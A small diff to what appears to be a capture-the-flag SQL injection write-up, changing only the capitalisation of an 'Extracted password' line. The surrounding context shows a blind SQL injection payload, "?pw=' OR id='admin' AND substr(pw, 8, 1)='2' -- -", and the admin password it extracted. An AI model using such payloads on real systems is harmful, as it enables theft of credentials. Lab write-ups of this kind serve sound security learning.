@@ -213,7 +213,7 @@ for index in range(1, password_length + 1):
       break
 
 print()
-print(f"Extracted Password: {password}")
+print(f"Extracted password: {password}")
 print(f"Final payload: ?pw={password}")
 ```
 
@@ -240,7 +240,7 @@ Character at index 7: 5
 Payload: ?pw=' OR id='admin' AND substr(pw, 8, 1)='2' -- -
 Character at index 8: 2
 
-Extracted Password: 095a9852
+Extracted password: 095a9852
 Final payload: ?pw=095a9852
 ```
 
